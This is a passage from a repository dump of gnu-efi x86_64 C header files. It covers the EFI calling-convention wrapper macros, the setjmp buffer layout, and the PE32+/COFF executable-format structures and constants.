#define INTERFACE_DECL(x) typedef struct x
#endif
#endif

/* for x86_64, EFI_FUNCTION_WRAPPER must be defined */
#if defined(HAVE_USE_MS_ABI)
#define uefi_call_wrapper(func, va_num, ...) func(__VA_ARGS__)
#else
/*
  Credits for macro-magic:
    https://groups.google.com/forum/?fromgroups#!topic/comp.std.c/d-6Mj5Lko_s
    http://efesx.com/2010/08/31/overloading-macros/
*/
#define __VA_NARG__(...)                        \
  __VA_NARG_(_0, ## __VA_ARGS__, __RSEQ_N())
#define __VA_NARG_(...)                         \
  __VA_ARG_N(__VA_ARGS__)
#define __VA_ARG_N(                             \
  _0,_1,_2,_3,_4,_5,_6,_7,_8,_9,_10,N,...) N
#define __RSEQ_N()                              \
  10, 9,  8,  7,  6,  5,  4,  3,  2,  1,  0

#define __VA_ARG_NSUFFIX__(prefix,...)                  \
  __VA_ARG_NSUFFIX_N(prefix, __VA_NARG__(__VA_ARGS__))
#define __VA_ARG_NSUFFIX_N(prefix,nargs)        \
  __VA_ARG_NSUFFIX_N_(prefix, nargs)
#define __VA_ARG_NSUFFIX_N_(prefix,nargs)       \
  prefix ## nargs

/* Prototypes of EFI cdecl -> stdcall trampolines */
UINT64 efi_call0(void *func);
UINT64 efi_call1(void *func, UINT64 arg1);
UINT64 efi_call2(void *func, UINT64 arg1, UINT64 arg2);
UINT64 efi_call3(void *func, UINT64 arg1, UINT64 arg2, UINT64 arg3);
UINT64 efi_call4(void *func, UINT64 arg1, UINT64 arg2, UINT64 arg3,
                 UINT64 arg4);
UINT64 efi_call5(void *func, UINT64 arg1, UINT64 arg2, UINT64 arg3,
                 UINT64 arg4, UINT64 arg5);
UINT64 efi_call6(void *func, UINT64 arg1, UINT64 arg2, UINT64 arg3,
                 UINT64 arg4, UINT64 arg5, UINT64 arg6);
UINT64 efi_call7(void *func, UINT64 arg1, UINT64 arg2, UINT64 arg3,
                 UINT64 arg4, UINT64 arg5, UINT64 arg6, UINT64 arg7);
UINT64 efi_call8(void *func, UINT64 arg1, UINT64 arg2, UINT64 arg3,
                 UINT64 arg4, UINT64 arg5, UINT64 arg6, UINT64 arg7,
                 UINT64 arg8);
UINT64 efi_call9(void *func, UINT64 arg1, UINT64 arg2, UINT64 arg3,
                 UINT64 arg4, UINT64 arg5, UINT64 arg6, UINT64 arg7,
                 UINT64 arg8, UINT64 arg9);
UINT64 efi_call10(void *func, UINT64 arg1, UINT64 arg2, UINT64 arg3,
                  UINT64 arg4, UINT64 arg5, UINT64 arg6, UINT64 arg7,
                  UINT64 arg8, UINT64 arg9, UINT64 arg10);

/* Front-ends to efi_callX to avoid compiler warnings */
#define _cast64_efi_call0(f) \
  efi_call0(f)
#define _cast64_efi_call1(f,a1) \
  efi_call1(f, (UINT64)(a1))
#define _cast64_efi_call2(f,a1,a2) \
  efi_call2(f, (UINT64)(a1), (UINT64)(a2))
#define _cast64_efi_call3(f,a1,a2,a3) \
  efi_call3(f, (UINT64)(a1), (UINT64)(a2), (UINT64)(a3))
#define _cast64_efi_call4(f,a1,a2,a3,a4) \
  efi_call4(f, (UINT64)(a1), (UINT64)(a2), (UINT64)(a3), (UINT64)(a4))
#define _cast64_efi_call5(f,a1,a2,a3,a4,a5) \
  efi_call5(f, (UINT64)(a1), (UINT64)(a2), (UINT64)(a3), (UINT64)(a4), \
            (UINT64)(a5))
#define _cast64_efi_call6(f,a1,a2,a3,a4,a5,a6) \
  efi_call6(f, (UINT64)(a1), (UINT64)(a2), (UINT64)(a3), (UINT64)(a4), \
            (UINT64)(a5), (UINT64)(a6))
#define _cast64_efi_call7(f,a1,a2,a3,a4,a5,a6,a7) \
  efi_call7(f, (UINT64)(a1), (UINT64)(a2), (UINT64)(a3), (UINT64)(a4), \
            (UINT64)(a5), (UINT64)(a6), (UINT64)(a7))
#define _cast64_efi_call8(f,a1,a2,a3,a4,a5,a6,a7,a8) \
  efi_call8(f, (UINT64)(a1), (UINT64)(a2), (UINT64)(a3), (UINT64)(a4), \
            (UINT64)(a5), (UINT64)(a6), (UINT64)(a7), (UINT64)(a8))
#define _cast64_efi_call9(f,a1,a2,a3,a4,a5,a6,a7,a8,a9) \
  efi_call9(f, (UINT64)(a1), (UINT64)(a2), (UINT64)(a3), (UINT64)(a4), \
            (UINT64)(a5), (UINT64)(a6), (UINT64)(a7), (UINT64)(a8), \
            (UINT64)(a9))
#define _cast64_efi_call10(f,a1,a2,a3,a4,a5,a6,a7,a8,a9,a10) \
  efi_call10(f, (UINT64)(a1), (UINT64)(a2), (UINT64)(a3), (UINT64)(a4), \
             (UINT64)(a5), (UINT64)(a6), (UINT64)(a7), (UINT64)(a8), \
             (UINT64)(a9), (UINT64)(a10))

/* main wrapper (va_num ignored) */
#define uefi_call_wrapper(func,va_num,...)                        \
  __VA_ARG_NSUFFIX__(_cast64_efi_call, __VA_ARGS__) (func , ##__VA_ARGS__)

#endif

#if defined(HAVE_USE_MS_ABI) && !defined(_MSC_EXTENSIONS)
    #define EFI_FUNCTION __attribute__((ms_abi))
#else
    #define EFI_FUNCTION
#endif

#ifdef _MSC_EXTENSIONS
#pragma warning ( disable : 4731 )  // Suppress warnings about modification of EBP
#endif

#endif

```

`include/gnu-efi/x86_64/efilibplat.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efilibplat.h

Abstract:

    EFI to compile bindings




Revision History

--*/

VOID
InitializeLibPlatform (
    IN EFI_HANDLE           ImageHandle,
    IN EFI_SYSTEM_TABLE     *SystemTable
    );

   

```

`include/gnu-efi/x86_64/efisetjmp_arch.h`:

```h
#ifndef GNU_EFI_X86_64_SETJMP_H
#define GNU_EFI_X86_64_SETJMP_H

#define JMPBUF_ALIGN 8

typedef struct {
	UINT64	Rbx;
	UINT64	Rsp;
	UINT64	Rbp;

	UINT64	Rdi;
	UINT64	Rsi;
	UINT64	R12;
	UINT64	R13;
	UINT64	R14;
	UINT64	R15;
	UINT64	Rip;
	UINT64	MxCsr;
	UINT8	XmmBuffer[160]; // XMM6 - XMM15
} ALIGN(JMPBUF_ALIGN) jmp_buf[1];

#endif /* GNU_EFI_X86_64_SETJMP_H */

```

`include/gnu-efi/x86_64/pe.h`:

```h
/* 
    PE32+ header file
 */
#ifndef _PE_H
#define _PE_H

#define IMAGE_DOS_SIGNATURE                 0x5A4D      // MZ
#define IMAGE_OS2_SIGNATURE                 0x454E      // NE
#define IMAGE_OS2_SIGNATURE_LE              0x454C      // LE
#define IMAGE_NT_SIGNATURE                  0x00004550  // PE00  
#define IMAGE_EDOS_SIGNATURE                0x44454550  // PEED


typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
    UINT16   e_magic;                     // Magic number
    UINT16   e_cblp;                      // Bytes on last page of file
    UINT16   e_cp;                        // Pages in file
    UINT16   e_crlc;                      // Relocations
    UINT16   e_cparhdr;                   // Size of header in paragraphs
    UINT16   e_minalloc;                  // Minimum extra paragraphs needed
    UINT16   e_maxalloc;                  // Maximum extra paragraphs needed
    UINT16   e_ss;                        // Initial (relative) SS value
    UINT16   e_sp;                        // Initial SP value
    UINT16   e_csum;                      // Checksum
    UINT16   e_ip;                        // Initial IP value
    UINT16   e_cs;                        // Initial (relative) CS value
    UINT16   e_lfarlc;                    // File address of relocation table
    UINT16   e_ovno;                      // Overlay number
    UINT16   e_res[4];                    // Reserved words
    UINT16   e_oemid;                     // OEM identifier (for e_oeminfo)
    UINT16   e_oeminfo;                   // OEM information; e_oemid specific
    UINT16   e_res2[10];                  // Reserved words
    UINT32   e_lfanew;                    // File address of new exe header
  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_OS2_HEADER {      // OS/2 .EXE header
    UINT16   ne_magic;                    // Magic number
    UINT8    ne_ver;                      // Version number
    UINT8    ne_rev;                      // Revision number
    UINT16   ne_enttab;                   // Offset of Entry Table
    UINT16   ne_cbenttab;                 // Number of bytes in Entry Table
    UINT32   ne_crc;                      // Checksum of whole file
    UINT16   ne_flags;                    // Flag UINT16
    UINT16   ne_autodata;                 // Automatic data segment number
    UINT16   ne_heap;                     // Initial heap allocation
    UINT16   ne_stack;                    // Initial stack allocation
    UINT32   ne_csip;                     // Initial CS:IP setting
    UINT32   ne_sssp;                     // Initial SS:SP setting
    UINT16   ne_cseg;                     // Count of file segments
    UINT16   ne_cmod;                     // Entries in Module Reference Table
    UINT16   ne_cbnrestab;                // Size of non-resident name table
    UINT16   ne_segtab;                   // Offset of Segment Table
    UINT16   ne_rsrctab;                  // Offset of Resource Table
    UINT16   ne_restab;                   // Offset of resident name table
    UINT16   ne_modtab;                   // Offset of Module Reference Table
    UINT16   ne_imptab;                   // Offset of Imported Names Table
    UINT32   ne_nrestab;                  // Offset of Non-resident Names Table
    UINT16   ne_cmovent;                  // Count of movable entries
    UINT16   ne_align;                    // Segment alignment shift count
    UINT16   ne_cres;                     // Count of resource segments
    UINT8    ne_exetyp;                   // Target Operating system
    UINT8    ne_flagsothers;              // Other .EXE flags
    UINT16   ne_pretthunks;               // offset to return thunks
    UINT16   ne_psegrefbytes;             // offset to segment ref. bytes
    UINT16   ne_swaparea;                 // Minimum code swap area size
    UINT16   ne_expver;                   // Expected Windows version number
  } IMAGE_OS2_HEADER, *PIMAGE_OS2_HEADER;

//
// File header format.
//

typedef struct _IMAGE_FILE_HEADER {
    UINT16   Machine;
    UINT16   NumberOfSections;
    UINT32   TimeDateStamp;
    UINT32   PointerToSymbolTable;
    UINT32   NumberOfSymbols;
    UINT16   SizeOfOptionalHeader;
    UINT16   Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

#define IMAGE_SIZEOF_FILE_HEADER             20

#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  // Relocation info stripped from file.
#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  // File is executable  (i.e. no unresolved externel references).
#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  // Line nunbers stripped from file.
#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  // Local symbols stripped from file.
#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  // Bytes of machine word are reversed.
#define IMAGE_FILE_32BIT_MACHINE             0x0100  // 32 bit word machine.
#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  // Debugging info stripped from file in .DBG file
#define IMAGE_FILE_SYSTEM                    0x1000  // System File.
#define IMAGE_FILE_DLL                       0x2000  // File is a DLL.
#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  // Bytes of machine word are reversed.

#define IMAGE_FILE_MACHINE_UNKNOWN           0
#define IMAGE_FILE_MACHINE_I386              0x14c   // Intel 386.
#define IMAGE_FILE_MACHINE_R3000             0x162   // MIPS little-endian, 0540 big-endian
#define IMAGE_FILE_MACHINE_R4000             0x166   // MIPS little-endian
#define IMAGE_FILE_MACHINE_ALPHA             0x184   // Alpha_AXP
#define IMAGE_FILE_MACHINE_ARMTHUMB_MIXED    0x1c2   // Arm/Thumb
#define IMAGE_FILE_MACHINE_POWERPC           0x1F0   // IBM PowerPC Little-Endian
#define IMAGE_FILE_MACHINE_IA64              0x200   // IA-64
#define IMAGE_FILE_MACHINE_TAHOE             0x7cc   // Intel EM machine
#define IMAGE_FILE_MACHINE_EBC               0xebc   // EFI Byte Code
#define IMAGE_FILE_MACHINE_X64               0x8664  // x86_64
//
// Directory format.
//

typedef struct _IMAGE_DATA_DIRECTORY {
    UINT32   VirtualAddress;
    UINT32   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16

//
// Optional header format.
//

typedef struct _IMAGE_OPTIONAL_HEADER {
    //
    // Standard fields.
    //

    UINT16    Magic;
    UINT8     MajorLinkerVersion;
    UINT8     MinorLinkerVersion;
    UINT32    SizeOfCode;
    UINT32    SizeOfInitializedData;
    UINT32    SizeOfUninitializedData;
    UINT32    AddressOfEntryPoint;
    UINT32    BaseOfCode;
    UINT32    BaseOfData;
                
    //
    // NT additional fields.
    //

    UINT32   ImageBase;
    UINT32   SectionAlignment;
    UINT32   FileAlignment;
    UINT16   MajorOperatingSystemVersion;
    UINT16   MinorOperatingSystemVersion;
    UINT16   MajorImageVersion;
    UINT16   MinorImageVersion;
    UINT16   MajorSubsystemVersion;
    UINT16   MinorSubsystemVersion;
    UINT32   Reserved1;
    UINT32   SizeOfImage;
    UINT32   SizeOfHeaders;
    UINT32   CheckSum;
    UINT16   Subsystem;
    UINT16   DllCharacteristics;
    UINT32   SizeOfStackReserve;
    UINT32   SizeOfStackCommit;
    UINT32   SizeOfHeapReserve;
    UINT32   SizeOfHeapCommit;
    UINT32   LoaderFlags;
    UINT32   NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;

typedef struct _IMAGE_ROM_OPTIONAL_HEADER {
    UINT16  Magic;
    UINT8   MajorLinkerVersion;
    UINT8   MinorLinkerVersion;
    UINT32  SizeOfCode;
    UINT32  SizeOfInitializedData;
    UINT32  SizeOfUninitializedData;
    UINT32  AddressOfEntryPoint;
    UINT32  BaseOfCode;
    UINT32  BaseOfData;
    UINT32  BaseOfBss;
    UINT32  GprMask;
    UINT32  CprMask[4];
    UINT32  GpValue;
} IMAGE_ROM_OPTIONAL_HEADER, *PIMAGE_ROM_OPTIONAL_HEADER;

#define IMAGE_SIZEOF_ROM_OPTIONAL_HEADER      56
#define IMAGE_SIZEOF_STD_OPTIONAL_HEADER      28
#define IMAGE_SIZEOF_NT_OPTIONAL_HEADER      224

#define IMAGE_NT_OPTIONAL_HDR_MAGIC        0x10b
#define IMAGE_ROM_OPTIONAL_HDR_MAGIC       0x107

typedef struct _IMAGE_NT_HEADERS {
    UINT32 Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER OptionalHeader;
} IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;

typedef struct _IMAGE_ROM_HEADERS {
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_ROM_OPTIONAL_HEADER OptionalHeader;
} IMAGE_ROM_HEADERS, *PIMAGE_ROM_HEADERS;

#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \
    ((UINT32)ntheader +                                                  \
     FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \
     ((PIMAGE_NT_HEADERS)(ntheader))->FileHeader.SizeOfOptionalHeader   \
    ))


// Subsystem Values

#define IMAGE_SUBSYSTEM_UNKNOWN              0   // Unknown subsystem.
#define IMAGE_SUBSYSTEM_NATIVE               1   // Image doesn't require a subsystem.
#define IMAGE_SUBSYSTEM_WINDOWS_GUI          2   // Image runs in the Windows GUI subsystem.
#define IMAGE_SUBSYSTEM_WINDOWS_CUI          3   // Image runs in the Windows character subsystem.
#define IMAGE_SUBSYSTEM_OS2_CUI              5   // image runs in the OS/2 character subsystem.
#define IMAGE_SUBSYSTEM_POSIX_CUI            7   // image run  in the Posix character subsystem.


// Directory Entries

#define IMAGE_DIRECTORY_ENTRY_EXPORT         0   // Export Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT         1   // Import Directory
#define IMAGE_DIRECTORY_ENTRY_RESOURCE       2   // Resource Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION      3   // Exception Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY       4   // Security Directory
#define IMAGE_DIRECTORY_ENTRY_BASERELOC      5   // Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_DEBUG          6   // Debug Directory
#define IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7   // Description String
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8   // Machine Value (MIPS GP)
#define IMAGE_DIRECTORY_ENTRY_TLS            9   // TLS Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG   10   // Load Configuration Directory

//
// Section header format.
//

#define IMAGE_SIZEOF_SHORT_NAME              8

typedef struct _IMAGE_SECTION_HEADER {
    UINT8   Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
            UINT32   PhysicalAddress;
            UINT32   VirtualSize;
    } Misc;
    UINT32   VirtualAddress;
    UINT32   SizeOfRawData;
    UINT32   PointerToRawData;
    UINT32   PointerToRelocations;
    UINT32   PointerToLinenumbers;
    UINT16   NumberOfRelocations;
    UINT16   NumberOfLinenumbers;
    UINT32   Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

#define IMAGE_SIZEOF_SECTION_HEADER          40

#define IMAGE_SCN_TYPE_NO_PAD                0x00000008  // Reserved.

#define IMAGE_SCN_CNT_CODE                   0x00000020  // Section contains code.
#define IMAGE_SCN_CNT_INITIALIZED_DATA       0x00000040  // Section contains initialized data.
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA     0x00000080  // Section contains uninitialized data.

#define IMAGE_SCN_LNK_OTHER                  0x00000100  // Reserved.
#define IMAGE_SCN_LNK_INFO                   0x00000200  // Section contains comments or some other type of information.
#define IMAGE_SCN_LNK_REMOVE                 0x00000800  // Section contents will not become part of image.
#define IMAGE_SCN_LNK_COMDAT                 0x00001000  // Section contents comdat.

#define IMAGE_SCN_ALIGN_1BYTES               0x00100000  //
#define IMAGE_SCN_ALIGN_2BYTES               0x00200000  //
#define IMAGE_SCN_ALIGN_4BYTES               0x00300000  //
#define IMAGE_SCN_ALIGN_8BYTES               0x00400000  //
#define IMAGE_SCN_ALIGN_16BYTES              0x00500000  // Default alignment if no others are specified.
#define IMAGE_SCN_ALIGN_32BYTES              0x00600000  //
#define IMAGE_SCN_ALIGN_64BYTES              0x00700000  //

#define IMAGE_SCN_MEM_DISCARDABLE            0x02000000  // Section can be discarded.
#define IMAGE_SCN_MEM_NOT_CACHED             0x04000000  // Section is not cachable.
#define IMAGE_SCN_MEM_NOT_PAGED              0x08000000  // Section is not pageable.
#define IMAGE_SCN_MEM_SHARED                 0x10000000  // Section is shareable.
#define IMAGE_SCN_MEM_EXECUTE                0x20000000  // Section is executable.
#define IMAGE_SCN_MEM_READ                   0x40000000  // Section is readable.
#define IMAGE_SCN_MEM_WRITE                  0x80000000  // Section is writeable.

//
// Symbol format.
//


#define IMAGE_SIZEOF_SYMBOL                  18

//
// Section values.
//
// Symbols have a section number of the section in which they are
// defined. Otherwise, section numbers have the following meanings:
//

#define IMAGE_SYM_UNDEFINED           (UINT16)0           // Symbol is undefined or is common.
#define IMAGE_SYM_ABSOLUTE            (UINT16)-1          // Symbol is an absolute value.
#define IMAGE_SYM_DEBUG               (UINT16)-2          // Symbol is a special debug item.

//
// Type (fundamental) values.
//

#define IMAGE_SYM_TYPE_NULL                  0           // no type.
#define IMAGE_SYM_TYPE_VOID                  1           //
#define IMAGE_SYM_TYPE_CHAR                  2           // type character.
#define IMAGE_SYM_TYPE_SHORT                 3           // type short integer.
#define IMAGE_SYM_TYPE_INT                   4           //
#define IMAGE_SYM_TYPE_LONG                  5           //
#define IMAGE_SYM_TYPE_FLOAT                 6           //
#define IMAGE_SYM_TYPE_DOUBLE                7           //
#define IMAGE_SYM_TYPE_STRUCT                8           //
#define IMAGE_SYM_TYPE_UNION                 9           //
#define IMAGE_SYM_TYPE_ENUM                  10          // enumeration.
#define IMAGE_SYM_TYPE_MOE                   11          // member of enumeration.
#define IMAGE_SYM_TYPE_BYTE                  12          //
#define IMAGE_SYM_TYPE_WORD                  13          //
#define IMAGE_SYM_TYPE_UINT                  14          //
#define IMAGE_SYM_TYPE_DWORD                 15          //

//
// Type (derived) values.
//

#define IMAGE_SYM_DTYPE_NULL                 0           // no derived type.
#define IMAGE_SYM_DTYPE_POINTER              1           // pointer.
#define IMAGE_SYM_DTYPE_FUNCTION             2           // function.
#define IMAGE_SYM_DTYPE_ARRAY                3           // array.

//
// Storage classes.
//

#define IMAGE_SYM_CLASS_END_OF_FUNCTION      (BYTE )-1
#define IMAGE_SYM_CLASS_NULL                 0
#define IMAGE_SYM_CLASS_AUTOMATIC            1
#define IMAGE_SYM_CLASS_EXTERNAL             2
#define IMAGE_SYM_CLASS_STATIC               3
#define IMAGE_SYM_CLASS_REGISTER             4
#define IMAGE_SYM_CLASS_EXTERNAL_DEF         5
#define IMAGE_SYM_CLASS_LABEL                6
#define IMAGE_SYM_CLASS_UNDEFINED_LABEL      7
#define IMAGE_SYM_CLASS_MEMBER_OF_STRUCT     8
#define IMAGE_SYM_CLASS_ARGUMENT             9
#define IMAGE_SYM_CLASS_STRUCT_TAG           10
#define IMAGE_SYM_CLASS_MEMBER_OF_UNION      11
#define IMAGE_SYM_CLASS_UNION_TAG            12
#define IMAGE_SYM_CLASS_TYPE_DEFINITION      13
#define IMAGE_SYM_CLASS_UNDEFINED_STATIC     14
#define IMAGE_SYM_CLASS_ENUM_TAG             15
#define IMAGE_SYM_CLASS_MEMBER_OF_ENUM       16
#define IMAGE_SYM_CLASS_REGISTER_PARAM       17
#define IMAGE_SYM_CLASS_BIT_FIELD            18
#define IMAGE_SYM_CLASS_BLOCK                100
#define IMAGE_SYM_CLASS_FUNCTION             101
#define IMAGE_SYM_CLASS_END_OF_STRUCT        102
#define IMAGE_SYM_CLASS_FILE                 103
// new
#define IMAGE_SYM_CLASS_SECTION              104
#define IMAGE_SYM_CLASS_WEAK_EXTERNAL        105

// type packing constants

#define N_BTMASK                            017
#define N_TMASK                             060
#define N_TMASK1                            0300
#define N_TMASK2                            0360
#define N_BTSHFT                            4
#define N_TSHIFT                            2

// MACROS

//
// Communal selection types.
//

#define IMAGE_COMDAT_SELECT_NODUPLICATES   1
#define IMAGE_COMDAT_SELECT_ANY            2
#define IMAGE_COMDAT_SELECT_SAME_SIZE      3
#define IMAGE_COMDAT_SELECT_EXACT_MATCH    4
#define IMAGE_COMDAT_SELECT_ASSOCIATIVE    5

#define IMAGE_WEAK_EXTERN_SEARCH_NOLIBRARY 1
#define IMAGE_WEAK_EXTERN_SEARCH_LIBRARY   2
#define IMAGE_WEAK_EXTERN_SEARCH_ALIAS     3


//
// Relocation format.
//

typedef struct _IMAGE_RELOCATION {
    UINT32   VirtualAddress;
    UINT32   SymbolTableIndex;
    UINT16    Type;
} IMAGE_RELOCATION;

#define IMAGE_SIZEOF_RELOCATION              10

//
// I386 relocation types.
//

#define IMAGE_REL_I386_ABSOLUTE              0           // Reference is absolute, no relocation is necessary
#define IMAGE_REL_I386_DIR16                 01          // Direct 16-bit reference to the symbols virtual address
#define IMAGE_REL_I386_REL16                 02          // PC-relative 16-bit reference to the symbols virtual address
#define IMAGE_REL_I386_DIR32                 06          // Direct 32-bit reference to the symbols virtual address
#define IMAGE_REL_I386_DIR32NB               07          // Direct 32-bit reference to the symbols virtual address, base not included
#define IMAGE_REL_I386_SEG12                 011         // Direct 16-bit reference to the segment-selector bits of a 32-bit virtual address
#define IMAGE_REL_I386_SECTION               012
#define IMAGE_REL_I386_SECREL                013
#define IMAGE_REL_I386_REL32                 024         // PC-relative 32-bit reference to the symbols virtual address

//
// MIPS relocation types.
//

#define IMAGE_REL_MIPS_ABSOLUTE              0           // Reference is absolute, no relocation is necessary
#define IMAGE_REL_MIPS_REFHALF               01
#define IMAGE_REL_MIPS_REFWORD               02
#define IMAGE_REL_MIPS_JMPADDR               03
#define IMAGE_REL_MIPS_REFHI                 04
#define IMAGE_REL_MIPS_REFLO                 05
#define IMAGE_REL_MIPS_GPREL                 06
#define IMAGE_REL_MIPS_LITERAL               07
#define IMAGE_REL_MIPS_SECTION               012
#define IMAGE_REL_MIPS_SECREL                013
#define IMAGE_REL_MIPS_REFWORDNB             042
#define IMAGE_REL_MIPS_PAIR                  045

//
// Alpha Relocation types.
//

#define IMAGE_REL_ALPHA_ABSOLUTE             0x0
#define IMAGE_REL_ALPHA_REFLONG              0x1
#define IMAGE_REL_ALPHA_REFQUAD              0x2
#define IMAGE_REL_ALPHA_GPREL32              0x3
#define IMAGE_REL_ALPHA_LITERAL              0x4
#define IMAGE_REL_ALPHA_LITUSE               0x5
#define IMAGE_REL_ALPHA_GPDISP               0x6
#define IMAGE_REL_ALPHA_BRADDR               0x7
#define IMAGE_REL_ALPHA_HINT                 0x8
#define IMAGE_REL_ALPHA_INLINE_REFLONG       0x9
#define IMAGE_REL_ALPHA_REFHI                0xA
#define IMAGE_REL_ALPHA_REFLO                0xB
#define IMAGE_REL_ALPHA_PAIR                 0xC
#define IMAGE_REL_ALPHA_MATCH                0xD
#define IMAGE_REL_ALPHA_SECTION              0xE
#define IMAGE_REL_ALPHA_SECREL               0xF
#define IMAGE_REL_ALPHA_REFLONGNB            0x10

//
// IBM PowerPC relocation types.
//

#define IMAGE_REL_PPC_ABSOLUTE 0x0000  // NOP
#define IMAGE_REL_PPC_ADDR64   0x0001  // 64-bit address
#define IMAGE_REL_PPC_ADDR32   0x0002  // 32-bit address
#define IMAGE_REL_PPC_ADDR24   0x0003  // 26-bit address, shifted left 2 (branch absolute)
#define IMAGE_REL_PPC_ADDR16   0x0004  // 16-bit address
#define IMAGE_REL_PPC_ADDR14   0x0005  // 16-bit address, shifted left 2 (load doubleword)
#define IMAGE_REL_PPC_REL24    0x0006  // 26-bit PC-relative offset, shifted left 2 (branch relative)
#define IMAGE_REL_PPC_REL14    0x0007  // 16-bit PC-relative offset, shifted left 2 (br cond relative)
#define IMAGE_REL_PPC_TOCREL16 0x0008  // 16-bit offset from TOC base
#define IMAGE_REL_PPC_TOCREL14 0x0009  // 16-bit offset from TOC base, shifted left 2 (load doubleword)

#define IMAGE_REL_PPC_ADDR32NB 0x000A  // 32-bit addr w/o image base
#define IMAGE_REL_PPC_SECREL   0x000B  // va of containing section (as in an image sectionhdr)
#define IMAGE_REL_PPC_SECTION  0x000C  // sectionheader number
#define IMAGE_REL_PPC_IFGLUE   0x000D  // substitute TOC restore instruction iff symbol is glue code
#define IMAGE_REL_PPC_IMGLUE   0x000E  // symbol is glue code; virtual address is TOC restore instruction

#define IMAGE_REL_PPC_TYPEMASK 0x00FF  // mask to isolate above values in IMAGE_RELOCATION.Type

// Flag bits in IMAGE_RELOCATION.TYPE

#define IMAGE_REL_PPC_NEG      0x0100  // subtract reloc value rather than adding it
#define IMAGE_REL_PPC_BRTAKEN  0x0200  // fix branch prediction bit to predict branch taken
#define IMAGE_REL_PPC_BRNTAKEN 0x0400  // fix branch prediction bit to predict branch not taken
#define IMAGE_REL_PPC_TOCDEFN  0x0800  // toc slot defined in file (or, data in toc)

//
// Based relocation format.
//

typedef struct _IMAGE_BASE_RELOCATION {
    UINT32   VirtualAddress;
    UINT32   SizeOfBlock;
//  UINT16    TypeOffset[1];
} IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;

#define IMAGE_SIZEOF_BASE_RELOCATION         8

//
// Based relocation types.
//

#define IMAGE_REL_BASED_ABSOLUTE              0
#define IMAGE_REL_BASED_HIGH                  1
#define IMAGE_REL_BASED_LOW                   2
#define IMAGE_REL_BASED_HIGHLOW               3
#define IMAGE_REL_BASED_HIGHADJ               4
#define IMAGE_REL_BASED_MIPS_JMPADDR          5
#define IMAGE_REL_BASED_IA64_IMM64            9
#define IMAGE_REL_BASED_DIR64                 10

//
// Line number format.
//

typedef struct _IMAGE_LINENUMBER {
    union {
        UINT32   SymbolTableIndex;               // Symbol table index of function name if Linenumber is 0.
        UINT32   VirtualAddress;                 // Virtual address of line number.
    } Type;
    UINT16    Linenumber;                         // Line number.
} IMAGE_LINENUMBER;

#define IMAGE_SIZEOF_LINENUMBER              6

//
// Archive format.
//

#define IMAGE_ARCHIVE_START_SIZE             8
#define IMAGE_ARCHIVE_START                  "!<arch>\n"
#define IMAGE_ARCHIVE_END                    "`\n"
#define IMAGE_ARCHIVE_PAD                    "\n"
#define IMAGE_ARCHIVE_LINKER_MEMBER          "/               "
#define IMAGE_ARCHIVE_LONGNAMES_MEMBER       "//              "

typedef struct _IMAGE_ARCHIVE_MEMBER_HEADER {
    UINT8     Name[16];                          // File member name - `/' terminated.
    UINT8     Date[12];                          // File member date - decimal.
    UINT8     UserID[6];                         // File member user id - decimal.
    UINT8     GroupID[6];                        // File member group id - decimal.
    UINT8     Mode[8];                           // File member mode - octal.
    UINT8     Size[10];                          // File member size - decimal.
    UINT8     EndHeader[2];                      // String to end header.
} IMAGE_ARCHIVE_MEMBER_HEADER, *PIMAGE_ARCHIVE_MEMBER_HEADER;

#define IMAGE_SIZEOF_ARCHIVE_MEMBER_HDR      60

//
// DLL support.
//

//
// Export Format
//

typedef struct _IMAGE_EXPORT_DIRECTORY {
    UINT32   Characteristics;
    UINT32   TimeDateStamp;
    UINT16   MajorVersion;
    UINT16   MinorVersion;
    UINT32   Name;
    UINT32   Base;
    UINT32   NumberOfFunctions;
    UINT32   NumberOfNames;
    UINT32   *AddressOfFunctions;
    UINT32   *AddressOfNames;
    UINT32   *AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

//
// Import Format
//

typedef struct _IMAGE_IMPORT_BY_NAME {
    UINT16    Hint;
    UINT8     Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;

typedef struct _IMAGE_THUNK_DATA {
    union {
        UINT32 Function;
        UINT32 Ordinal;
        PIMAGE_IMPORT_BY_NAME AddressOfData;
    } u1;
} IMAGE_THUNK_DATA, *PIMAGE_THUNK_DATA;

#define IMAGE_ORDINAL_FLAG 0x80000000
#define IMAGE_SNAP_BY_ORDINAL(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG) != 0)
#define IMAGE_ORDINAL(Ordinal) (Ordinal & 0xffff)

